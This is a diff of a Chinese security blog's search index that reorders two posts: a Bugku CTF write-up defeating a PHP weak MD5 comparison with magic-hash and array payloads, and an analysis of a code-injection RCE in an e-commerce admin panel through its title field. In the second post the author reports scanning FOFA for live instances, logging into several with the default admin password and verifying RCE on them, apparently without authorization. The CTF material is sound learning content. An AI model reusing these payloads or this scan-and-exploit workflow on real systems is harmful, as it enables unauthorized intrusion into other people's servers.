@@ -1,33 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Bugku-CTF-备份是个好习惯</title>
-    <url>/2025/10/01/Bugku-CTF-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/</url>
-    <content><![CDATA[这题的话可以先从这个题目看应该是和备份有关系的，就会想到bak后缀。
-打开网站是一段神秘代码
-d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e
-然后就下意识的查看网站源代码但并没有什么收获，只能转向目录扫描了，直接上御剑目录扫描。
-发现有一个index.php.bak文件直接访问下载了一个备份文件，代码内容如下
-include_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&#x27;REQUEST_URI&#x27;], &#x27;?&#x27;);$str = substr($str,1);$str = str_replace(&#x27;key&#x27;,&#x27;&#x27;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;    echo $flag.&quot;取得flag&quot;;&#125;
-直接开始代码审计。
-if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;    echo $flag.&quot;取得flag&quot;;&#125;
-这个是他的一个验证逻辑就是将输入的两个值加密进行比较，要求a&#x3D;b和md5(a)&#x3D;md5(b)，现在就可以MD5弱类型比较来解决了。
-有些字符串的MD5值都以0e开头，在科学计数法中等于0：
-// 经典MD5碰撞值md5(&#x27;QNKCDZO&#x27;)          = 0e830400451993494058024219903391md5(&#x27;240610708&#x27;)        = 0e462097431906509019562988736854md5(&#x27;s878926199a&#x27;)      = 0e545993274517709034328855841020md5(&#x27;s155964671a&#x27;)      = 0e342768416822451524974117254469// 弱比较时：0e830400451993494058024219903391 == 0e462097431906509019562988736854// 因为都等于 0 × 10^N = 0
-借助这个漏洞就可以构建Payload:index.php?kkeyey1&#x3D;QNKCDZO&amp;kkeyey2&#x3D;240610708
-还有另一种方法：
-由于md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。
-所以可以也可以构建Payload:index.php?kkeyey1[]&#x3D;1&amp;kkeyey2[]&#x3D;2同样能获得flag。
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>WEB安全</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQL联合查询注入</title>
     <url>/2025/08/06/SQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[平时在浏览网页时会注意到有这种网址
@@ -209,6 +182,33 @@ Python 实现代码import math# 训练数据：[[身高(cm), 体重(kg), 类别]
       </tags>
   </entry>
   <entry>
+    <title>Bugku-CTF-备份是个好习惯</title>
+    <url>/2025/10/01/Bugku-CTF-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/</url>
+    <content><![CDATA[这题的话可以先从这个题目看应该是和备份有关系的，就会想到bak后缀。
+打开网站是一段神秘代码
+d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e
+然后就下意识的查看网站源代码但并没有什么收获，只能转向目录扫描了，直接上御剑目录扫描。
+发现有一个index.php.bak文件直接访问下载了一个备份文件，代码内容如下
+include_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&#x27;REQUEST_URI&#x27;], &#x27;?&#x27;);$str = substr($str,1);$str = str_replace(&#x27;key&#x27;,&#x27;&#x27;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;    echo $flag.&quot;取得flag&quot;;&#125;
+直接开始代码审计。
+if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;    echo $flag.&quot;取得flag&quot;;&#125;
+这个是他的一个验证逻辑就是将输入的两个值加密进行比较，要求a&#x3D;b和md5(a)&#x3D;md5(b)，现在就可以MD5弱类型比较来解决了。
+有些字符串的MD5值都以0e开头，在科学计数法中等于0：
+// 经典MD5碰撞值md5(&#x27;QNKCDZO&#x27;)          = 0e830400451993494058024219903391md5(&#x27;240610708&#x27;)        = 0e462097431906509019562988736854md5(&#x27;s878926199a&#x27;)      = 0e545993274517709034328855841020md5(&#x27;s155964671a&#x27;)      = 0e342768416822451524974117254469// 弱比较时：0e830400451993494058024219903391 == 0e462097431906509019562988736854// 因为都等于 0 × 10^N = 0
+借助这个漏洞就可以构建Payload:index.php?kkeyey1&#x3D;QNKCDZO&amp;kkeyey2&#x3D;240610708
+还有另一种方法：
+由于md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。
+所以可以也可以构建Payload:index.php?kkeyey1[]&#x3D;1&amp;kkeyey2[]&#x3D;2同样能获得flag。
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>WEB安全</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>edusrc账号信息收集</title>
     <url>/2026/02/04/edusrc%E8%B4%A6%E5%8F%B7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
     <content><![CDATA[⚠️ 安全声明本文章未经许可严禁转载。文中内容仅限交流学习，严禁用于商业及非法用途，未经授权的渗透行为皆为违法行为，违规使用后果自负，与本作者无关。
@@ -240,33 +240,6 @@ edusrc的最重要的信息就是后台的账号和密码了，因为后台通�
         <tag>edusrc</tag>
         <tag>src</tag>
         <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>电商平台后台RCE漏洞分析：从弱口令到0day利用</title>
-    <url>/2025/09/06/%E7%94%B5%E5%95%86%E5%B9%B3%E5%8F%B0%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A%E4%BB%8E%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%88%B00day%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[近日，朋友发现某电商平台存在一个高危漏洞，将数据包发给我进行审计。首先使用Seay源代码审计系统对代码包进行自动化扫描，系统报告了300+个潜在漏洞点，我将结果丢给AI，从中筛选出1个最可能被利用的高危远程代码漏洞。
-漏洞位置app/common/logic/admin/config.php文件中的配置写入功能存在代码注入漏洞。
-漏洞代码$code = &quot;return [    &#x27;url&#x27; =&gt; &#x27;&quot; . $param[&#x27;m_url&#x27;] . &quot;&#x27;,    &#x27;title&#x27; =&gt; &#x27;&quot; . $param[&#x27;title&#x27;] . &quot;&#x27;,    &#x27;map_key&#x27; =&gt; &#x27;&quot; . $param[&#x27;map_key&#x27;] . &quot;&#x27;]&quot;;$code = &quot;&lt;?php\n &quot; . $code . &quot;;&quot;;file_put_contents(config_path() . &quot;site.php&quot;, $code);
-
-漏洞原理
-该段代码直接将用户输入的参数（$param[‘title’]等）拼接至PHP配置文件中，未做任何过滤处理。攻击者可以通过注入PHP代码，实现远程代码执行。漏洞复现
-在后台修改网站标题处输入：.phpinfo().
-系统生成的配置文件内容变为：
-&lt;?phpreturn [    &#x27;url&#x27; =&gt; &#x27;http://example.com&#x27;,    &#x27;title&#x27; =&gt; &#x27;&#x27;.phpinfo().&#x27;&#x27;,    &#x27;map_key&#x27; =&gt; &#x27;key_value&#x27;];
-
-访问&#x2F;config&#x2F;site.php文件即可触发phpinfo()执行。
-但该漏洞需要后台权限才能利用，我发现管理员后台账号密码默认为admin。
-在FOFA找到百个资产，测试了10个有4个存在弱口令，RCE也验证成功。
-因此攻击链可完整形成：
-弱口令进入后台 → 利用RCE漏洞获取服务器权限
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>WEB安全</tag>
-        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -352,6 +325,33 @@ edusrc的最重要的信息就是后台的账号和密码了，因为后台通�
         <tag>Ubuntu</tag>
         <tag>系统安装</tag>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>电商平台后台RCE漏洞分析：从弱口令到0day利用</title>
+    <url>/2025/09/06/%E7%94%B5%E5%95%86%E5%B9%B3%E5%8F%B0%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A%E4%BB%8E%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%88%B00day%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[近日，朋友发现某电商平台存在一个高危漏洞，将数据包发给我进行审计。首先使用Seay源代码审计系统对代码包进行自动化扫描，系统报告了300+个潜在漏洞点，我将结果丢给AI，从中筛选出1个最可能被利用的高危远程代码漏洞。
+漏洞位置app/common/logic/admin/config.php文件中的配置写入功能存在代码注入漏洞。
+漏洞代码$code = &quot;return [    &#x27;url&#x27; =&gt; &#x27;&quot; . $param[&#x27;m_url&#x27;] . &quot;&#x27;,    &#x27;title&#x27; =&gt; &#x27;&quot; . $param[&#x27;title&#x27;] . &quot;&#x27;,    &#x27;map_key&#x27; =&gt; &#x27;&quot; . $param[&#x27;map_key&#x27;] . &quot;&#x27;]&quot;;$code = &quot;&lt;?php\n &quot; . $code . &quot;;&quot;;file_put_contents(config_path() . &quot;site.php&quot;, $code);
+
+漏洞原理
+该段代码直接将用户输入的参数（$param[‘title’]等）拼接至PHP配置文件中，未做任何过滤处理。攻击者可以通过注入PHP代码，实现远程代码执行。漏洞复现
+在后台修改网站标题处输入：.phpinfo().
+系统生成的配置文件内容变为：
+&lt;?phpreturn [    &#x27;url&#x27; =&gt; &#x27;http://example.com&#x27;,    &#x27;title&#x27; =&gt; &#x27;&#x27;.phpinfo().&#x27;&#x27;,    &#x27;map_key&#x27; =&gt; &#x27;key_value&#x27;];
+
+访问&#x2F;config&#x2F;site.php文件即可触发phpinfo()执行。
+但该漏洞需要后台权限才能利用，我发现管理员后台账号密码默认为admin。
+在FOFA找到百个资产，测试了10个有4个存在弱口令，RCE也验证成功。
+因此攻击链可完整形成：
+弱口令进入后台 → 利用RCE漏洞获取服务器权限
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>WEB安全</tag>
+        <tag>代码审计</tag>
       </tags>
   </entry>
 </search>
